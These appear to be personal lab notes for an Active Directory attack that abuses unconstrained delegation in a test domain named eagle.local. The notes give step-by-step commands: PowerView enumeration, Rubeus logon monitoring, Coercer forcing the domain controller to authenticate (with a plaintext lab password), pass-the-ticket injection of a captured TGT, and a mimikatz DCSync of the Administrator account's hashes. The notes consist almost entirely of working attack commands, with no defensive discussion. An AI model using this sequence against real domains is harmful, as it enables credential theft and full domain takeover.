	Desc:
		Configured server Unconstrained Delegation, capture its TGT by coercing a DC to auth to server.

	Usage:
		Enum with Get-NetComputer - Unconstrained | select samaccountname, imported from powerview.
		
		Listen with rubueos for new logons and extragt TGT:
		Rubeus.exe monitor /interval:1

		Use attacking vm to coerce the DC to the attacking unconstrained server with Coercer:
		
		Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

		The server listening with Rubeus catches the TGT

		We then pass the ticket and inject in memory by acting as the DC and perform DCsync afterwards:
			.\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...

		DCSync with mimi:
			.\mimikatz.exe "lsadump::dcsync /domain:eagle.local /user:Administrator"
